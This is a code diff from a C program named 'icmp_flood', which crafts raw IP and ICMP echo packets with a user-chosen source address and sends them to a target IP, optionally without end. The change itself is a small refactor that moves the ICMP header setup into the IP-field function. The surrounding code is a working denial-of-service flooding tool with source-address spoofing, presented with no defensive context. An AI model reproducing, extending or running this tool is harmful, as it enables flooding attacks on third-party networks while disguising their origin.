@@ -21,8 +21,9 @@ char *usage = "\nUsage: ./icmp_flood <saddr> <daddr> <# packets>\n \
 	<daddr> = target IP address\n \
 	<# packets> = is the number of packets to send, 100 is the default, 0 = infinite\n";
  
-void set_ip_layer_fields(struct icmphdr *icmp, struct ip *ip)
+void set_ip_layer_fields(struct ip *ip)
 {
+    
     // IP Layer
     ip->ip_v = 4;
     ip->ip_hl = sizeof*ip >> 2;
@@ -35,6 +36,7 @@ void set_ip_layer_fields(struct icmphdr *icmp, struct ip *ip)
     ip->ip_sum = 0; /* Let kernel fill in */
  
     // ICMP Layer
+    struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
     icmp->type = ICMP_ECHO;
     icmp->code = 0;	
     icmp->checksum = htons(~(ICMP_ECHO << 8));	
@@ -61,7 +63,7 @@ int main(int argc, char *argv[])
 {
     int s, i;	
     struct ip *ip = (struct ip *)buf;
-    struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
+    
     struct hostent *hp, *hp2;
     struct sockaddr_in dst;
     int offset;
@@ -105,7 +107,7 @@ int main(int argc, char *argv[])
         }else
             memcpy(&ip->ip_src.s_addr, hp2->h_addr_list[0], hp->h_length);
  
-        set_ip_layer_fields(icmp, ip);
+        set_ip_layer_fields(ip);
  
         dst.sin_addr = ip->ip_dst;
         dst.sin_family = AF_INET;
